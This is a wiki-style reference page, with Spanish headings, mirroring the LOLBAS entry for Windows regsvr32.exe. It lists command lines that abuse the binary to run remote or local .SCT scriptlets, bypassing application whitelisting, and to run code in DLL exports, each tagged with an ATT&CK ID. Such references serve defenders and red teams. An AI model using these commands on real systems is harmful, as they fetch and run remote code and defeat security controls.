# LOLBAS: Regsvr32.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`, `Execute`

Used by Windows to register dlls

## Comandos

### Execute code from remote scriptlet, bypass Application whitelisting

AWL Bypass · priv: User · T1218.010

```cmd
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
```

Execute the specified remote .SCT script with scrobj.dll.

### Execute code from scriptlet, bypass Application whitelisting

AWL Bypass · priv: User · T1218.010

```cmd
regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
```

Execute the specified local .SCT script with scrobj.dll.

### Execute code from remote scriptlet, bypass Application whitelisting

Execute · priv: User · T1218.010

```cmd
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
```

Execute the specified remote .SCT script with scrobj.dll.

### Execute code from scriptlet, bypass Application whitelisting

Execute · priv: User · T1218.010

```cmd
regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
```

Execute the specified local .SCT script with scrobj.dll.

### Execute DLL file

Execute · priv: User · T1218.010

```cmd
regsvr32.exe /s {PATH:.dll}
```

Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`.

### Execute DLL file

Execute · priv: User · T1218.010

```cmd
regsvr32.exe /u /s {PATH:.dll}
```

Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`.

